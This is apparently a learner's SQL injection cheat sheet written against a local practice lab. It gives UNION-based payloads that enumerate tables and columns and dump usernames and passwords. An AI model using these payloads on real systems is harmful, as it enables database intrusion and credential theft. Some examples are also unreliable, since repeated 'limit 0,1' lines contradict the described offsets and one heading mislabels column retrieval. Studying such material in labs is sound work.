SQLi
====


---------------
	Normal:      
	Attack:        
	

Basics
---------------
	Normal:     php?id='1'
	Attack:       php?id='1''


Commenting Remaining part of the quries
---------------
	Normal:     php?id='1' limit 1
	Attack:       php?id='1''-- this portion will be commented
	Attack:       php?id='1''# this portion will be commented


Getting Number of Columns by ORDER BY
----------------------------------------------

	in order by if left<=Right it show no error. and we can use this to find the number of columns used in the query
		Normal:      php?id='1' 
	         Attack:       php?id='1'' order by 1 --+		No Error
	         Attack:       php?id='1'' order by 2 --+		No Error
	         Attack:       php?id='1'' order by 3 --+ 		No Error
	         Attack:       php?id='1'' order by 4 --+		Error
			
			Then the number of columns used in the query is 3
	Ex:

	SELECT username,passwd FROM users where user_id=1 order by 1	---	will show no error
	SELECT username,passwd FROM users where user_id=1 order by 2	---	will show no error
	SELECT username,passwd FROM users where user_id=1 order by 3	---	will show error







Enumeration table name from information_schema database
----------------
	information schema is an database which cotains the infoamtion about other databases.
	
	Syntax : http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,2,3 --+
		     http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,WhatINeed,3 From_information_schema --+

	Attack: http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,table_name,3 from information_schema.tables where table_schema=database() --+
	Attack: http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,table_name,3 from information_schema.tables where table_schema='users' --+



Finding all the tables using Limit
------------------------------------

	By Default we can only get one table name at one time because the limit is set to [ limit 0,1] 
	which means start from zero and get me the one record we can input [ limit 1,1 ] start from 
	1 and get me one record and move on to [ limit 2,1]
		
	
	http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 --+		---	1st table

	http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 --+		---	2nd table
	http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 --+		---	3rd table


Finding all tables using group_concat()
-------------------------
	
	
	http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+			---	Will return all the tables in the database.




Getting Tables:
---------------

	http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+		---	Will show all the columns in the table users.

	


Dumping Data
---------------
	http://localhost/master/Less-1/index.php?id=-1' UNION ALL select 1,group_concat(username),group_concat(password) from users --+




Quote less injection
----------------------

	PHP: $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";				---	quote in necessory to breake the quote.
	Attack: http://127.0.0.1/master/Less-2/index.php?id=1' order by 1--+


	PHP: PHP: $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 			--- No quotes are necessort to breake the quotes.	

	Attack: http://127.0.0.1/master/Less-2/index.php?id=1 order by 1--+




Breake the quote
--------------------

PHP: $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";




Ticks
====

Find the Query to break using \
-------------------------
	http://127.0.0.1/master/Less-3/index.php?id=1\
	will show you error like [ MySQL server version for the right syntax to use near ''1\')  ] which means we have to escape 
